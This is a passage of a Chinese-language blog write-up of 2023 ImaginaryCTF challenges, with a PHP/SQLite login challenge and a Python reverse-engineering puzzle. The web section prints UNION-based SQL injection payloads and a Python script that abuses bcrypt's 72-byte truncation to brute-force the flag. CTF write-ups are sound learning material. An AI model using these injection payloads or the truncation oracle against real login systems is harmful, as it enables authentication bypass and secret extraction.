class="property">session</span>.<span class="property">loggedIn</span> = <span class="literal">true</span>;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Login successful!&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid username or password&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>sql查询的时候没有判断password是否是admin的password，那么只需要不报错，sql查到东西就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=a&quot;union select 1,2,3/*&amp;username=admin  //post</span><br></pre></td></tr></table></figure>
+<h2 id="login">login</h2>
+<p>赛后的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;FLAG&#x27;</span>] ?? <span class="string">&#x27;jctf&#123;test_flag&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$magic</span> = <span class="variable">$_ENV</span>[<span class="string">&#x27;MAGIC&#x27;</span>] ?? <span class="string">&#x27;aabbccdd11223344&#x27;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/db.sqlite3&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$magic</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> .= <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> &amp;&amp; <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">querySingle</span>(<span class="string">&quot;SELECT username, pwhash FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="title function_ invoke__">password_verify</span>(<span class="variable">$password</span>, <span class="variable">$res</span>[<span class="string">&#x27;pwhash&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$u</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Welcome <span class="subst">$u</span>! But there is no flag here :P&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$res</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$msg</span> .= <span class="string">&quot;&lt;!-- magic: <span class="subst">$magic</span> --&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;Invalid username or password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>首先第一步需要得到magic才能够使得password带上flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo password_hash(&quot;a&quot;, PASSWORD_DEFAULT);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">password_verify</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;<span class="subst">$2y</span><span class="subst">$10</span><span class="subst">$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO</span>&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过对username的注入登录到admin，获取到magic<code>688a35c685a7a654abc80f8e123ad9f0 </code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=a&amp;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;$2y$10$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO&#x27; AS pwhash/*</span><br></pre></td></tr></table></figure>
+<p>根据<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#password_hash-password_verify</a></p>
+<p>只能判断前72个字符，那么就可以开始爆破了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&quot;</span></span><br><span class="line"></span><br><span class="line">able = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^`&#123;|~&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ictf&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    length = <span class="number">71</span> - <span class="built_in">len</span>(flag)</span><br><span class="line">    password = <span class="string">&quot;a&quot;</span> * length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> able:</span><br><span class="line">        guess = password + flag + i</span><br><span class="line">        <span class="built_in">hash</span> = os.popen(<span class="string">f&quot;php exp.php <span class="subst">&#123;guess&#125;</span>&quot;</span>).read()</span><br><span class="line">        headers = &#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;  <span class="comment"># need for it</span></span><br><span class="line">        data = <span class="string">f&quot;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;<span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&#x27; AS pwhash/*&amp;password=<span class="subst">&#123;password&#125;</span>&quot;</span></span><br><span class="line">        r = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += i</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>:] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">password_hash</span>(<span class="variable">$argv</span>[<span class="number">1</span>], PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure>
+<p><img src="/img/image-20230724124904514.png" alt="image-20230724124904514" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;| 这三个在命令行会直接报错，如果之后遇到flag中有，又需要用命令行的可能需要特殊处理</span><br></pre></td></tr></table></figure>
+<h1>Re</h1>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line"> a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b[<span class="number">0</span>]*<span class="number">2</span>**<span class="number">24</span>+b[<span class="number">1</span>]*<span class="number">2</span>**<span class="number">16</span>+b[<span class="number">2</span>]*<span class="number">2</span>**<span class="number">8</span>+b[<span class="number">3</span>]+<span class="number">1</span>)][<span class="number">1</span>:]</span><br><span class="line"> c,i = <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">  i%=<span class="built_in">len</span>(a)</span><br><span class="line">  <span class="keyword">if</span> (a[i]!=<span class="number">0</span> <span class="keyword">and</span> c==<span class="number">1</span>):</span><br><span class="line">   a[i],c=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">  <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">   c+=<span class="number">1</span></span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    .----.   @   @</span></span><br><span class="line"><span class="string">   / .-&quot;-.`.  \v/</span></span><br><span class="line"><span class="string">   | | &#x27;\ \ \_/ )</span></span><br><span class="line"><span class="string"> ,-\ `-.&#x27; /.&#x27;  /</span></span><br><span class="line"><span class="string">&#x27;---`----&#x27;----&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&quot;Enter flag here: &quot;</span>).encode()</span><br><span class="line">out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [flag[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>)]:</span><br><span class="line">  out += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(enc(n[::-<span class="number">1</span>]))[<span class="number">2</span>:].zfill(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> out == <span class="string">b&#x27;L\xe8\xc6\xd2f\xde\xd4\xf6j\xd0\xe0\xcad\xe0\xbe\xe6J\xd8\xc4\xde`\xe6\xbe\xda&gt;\xc8\xca\xca^\xde\xde\xc4^\xde\xde\xdez\xe8\xe6\xde&#x27;</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[*] Flag correct!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&quot;[*] Flag incorrect.&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>本质上是对enc函数的简化，通过测试找规律</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1 3</span><br><span class="line">1 3 5 7</span><br><span class="line">1 3 5 7 9 11 13 15</span><br><span class="line">1 3 5 7 9 11 13 15 17 19 21 23 25 .....</span><br></pre></td></tr></table></figure>
+<p>从数字二开始就呈现这样的数字规律</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line">    a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b)][<span class="number">1</span>:]</span><br><span class="line">    c, i = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">        i %= <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span> <span class="keyword">and</span> c == <span class="number">1</span>):</span><br><span class="line">            a[i], c = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">            c += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">n</span>):</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    n = n - <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3000</span>):</span><br><span class="line">        x += <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">        <span class="keyword">if</span> n &lt; x:</span><br><span class="line">            x -= <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (n - x) * <span class="number">2</span> + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(num(i), i)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(enc(i), i)</span></span><br></pre></td></tr></table></figure>
+<p>然后写出简化的函数，测试第一个块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">b&#x27;L\xe8\xc6\xd2&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(x), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
+<p>是偶数，所以重新稍微修改函数返回值和结构，然后生成4字符的全部组合和数值即可</p>
+<p><a target="_blank" rel="noopener" href="http://xn--exp-dw1e34jo72bxk5d.py">最后全部exp.py</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">b</span>):</span><br><span class="line">    a = [n <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(b)][<span class="number">1</span>:]</span><br><span class="line">    c, i = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>([n <span class="keyword">for</span> n <span class="keyword">in</span> a <span class="keyword">if</span> n != <span class="number">0</span>]) &gt; <span class="number">1</span>:</span><br><span class="line">        i %= <span class="built_in">len</span>(a)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span> <span class="keyword">and</span> c == <span class="number">1</span>):</span><br><span class="line">            a[i], c = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>):</span><br><span class="line">            c += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span>(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num</span>(<span class="params">b</span>):</span><br><span class="line">    n = b[<span class="number">0</span>] * <span class="number">2</span> ** <span class="number">24</span> + b[<span class="number">1</span>] * <span class="number">2</span> ** <span class="number">16</span> + b[<span class="number">2</span>] * <span class="number">2</span> ** <span class="number">8</span> + b[<span class="number">3</span>] + <span class="number">1</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    n = n - <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3000</span>):</span><br><span class="line">        x += <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">        <span class="keyword">if</span> n &lt; x:</span><br><span class="line">            x -= <span class="built_in">pow</span>(<span class="number">2</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>((n - x) * <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(num(i), i)</span></span><br><span class="line"><span class="comment"># for i in range(30):</span></span><br><span class="line"><span class="comment">#     print(enc(i), i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># x = b&#x27;L\xe8\xc6\xd2&#x27;</span></span><br><span class="line"><span class="comment"># print(int(bytes.hex(x), 16))</span></span><br><span class="line"><span class="comment"># flag = b&#x27;ictf&#x27;</span></span><br><span class="line"><span class="comment"># for n in [flag[i:i+4] for i in range(0,len(flag),4)]:</span></span><br><span class="line"><span class="comment">#     print(num(n[::-1]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">all</span> = (string.digits + string.ascii_letters + <span class="string">&quot;&#123;_&#125;&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;all.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">all</span>:</span><br><span class="line">                x = (i+j+k+l).encode()</span><br><span class="line">                f.write(num(x[::-<span class="number">1</span>]) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(i + j + k + l) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                </span><br><span class="line">flag = <span class="string">b&#x27;L\xe8\xc6\xd2f\xde\xd4\xf6j\xd0\xe0\xcad\xe0\xbe\xe6J\xd8\xc4\xde`\xe6\xbe\xda&gt;\xc8\xca\xca^\xde\xde\xc4^\xde\xde\xdez\xe8\xe6\xde&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> [flag[i:i+<span class="number">4</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag),<span class="number">4</span>)]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">bytes</span>.<span class="built_in">hex</span>(n), <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
+<p>ctrl+f就行了</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>diffany
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://gudiffany.github.io/2023/08/16/13-36-40/" title="2023ImaginaryCTF">https://gudiffany.github.io/2023/08/16/13-36-40/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/2023ctf/" rel="tag"><i class="fa fa-tag"></i> 2023ctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/15/22-30-45/" rel="prev" title="vulhub复现">
+                  <i class="fa fa-chevron-left"></i> vulhub复现
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/08/16/17-48-33/" rel="next" title="java基础">
+                  java基础 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">diffany</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://unpkg.com/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://unpkg.com/@next-theme/pjax@0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+
+
+  <script src="[object Object]"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+  <script src="/%5Bobject%20Object%5D"></script>
+
+
+<script>
+var options = {
+  bottom: '64px', // default: '32px'
+  right: 'unset', // default: '32px'
+  left: '32px', // default: 'unset'
+  time: '0.5s', // default: '0.3s'
+  mixColor: '#fff', // default: '#fff'
+  backgroundColor: '#fff',  // default: '#fff'
+  buttonColorDark: '#100f2c',  // default: '#100f2c'
+  buttonColorLight: '#fff', // default: '#fff'
+  saveInCookies: true, // default: true,
+  label: '🌓', // default: ''
+  autoMatchOsTheme: true // default: true
+}
+const darkmode = new Darkmode(options);
+darkmode.showWidget();
+</script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://unpkg.com/hexo-generator-searchdb@1.4.1/dist/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"ImshWy4c6kiRqFukNXuAeVYt-gzGzoHsz","app_key":"I15dpBmlxhPPxNgS0pn9Fer5","server_url":null,"security":false}</script>
+  <script src="/js/third-party/statistics/lean-analytics.js"></script>
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://unpkg.com/mathjax@3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
